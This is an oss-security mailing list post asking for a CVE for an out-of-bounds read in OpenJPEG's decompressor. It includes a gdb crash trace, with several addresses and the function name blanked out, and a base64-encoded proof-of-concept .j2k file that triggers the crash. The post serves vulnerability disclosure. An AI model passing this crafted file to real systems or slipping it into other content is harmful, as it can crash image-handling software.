  oss-security - CVE request - OpenJPEG : Out-Of-Bounds Read in  function            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 14 Mar From: winsonliu(刘科) <winsonliu@...cent.com> To: oss-security <oss-security@...ts.openwall.com> Subject: CVE request - OpenJPEG : Out-Of-Bounds Read in  function  Hi all,  I find a vulnerability of OpenJPEG. The specific flaw exists within the function. A specially crafted image file can force Out-Of-Bounds Read occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg  The detailed information about this issue can be described as follows. --------------------------------- winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q Reading symbols from opj_decompress...(no debugging symbols found)...done.  (gdb) r -o image.pgm -i Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i  [INFO] Start to read j2k main header (0). [INFO] Main header has been correctly decoded. [INFO] No decoded area parameters, set the decoded area to the whole image [INFO] Header of tile 1 / 97 has been read. [INFO] Tile has been decoded. [INFO] Image data has been updated with tile 1.  Program received signal SIGSEGV, Segmentation fault. in ()  (gdb) bt #0  in () #1  in color_sycc_to_rgb () #2  in main ()  (gdb) x /i $eip => mov    (%eax),%ecx  (gdb) i r eax            ecx            0x0 0 edx            0x0 0 ebx            esp            ebp            esi            0x0 0 edi            0x0 0 eip            eflags         [ CF PF AF SF IF RF ] cs             ss             0x7b ds             0x7b es             0x7b fs             0x0 0 gs             51  (gdb) x /40xb Cannot access memory at address   The attachment is the proof-of-concept file. Alternatively, you can decode the following string using base64 and save the decoded content to a .j2k file. --------------------------------- /0//UQAvAAAAAACAAAAwgAAAAHsAAAAAAAAAgAAAAIAAAAAAAAAAAAADBwEBBwIBBwIB/1IAEgEA gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID/2Q==   CREDIT: This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.   Content of type "text/html" skipped  Download attachment of type "application/octet-stream" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      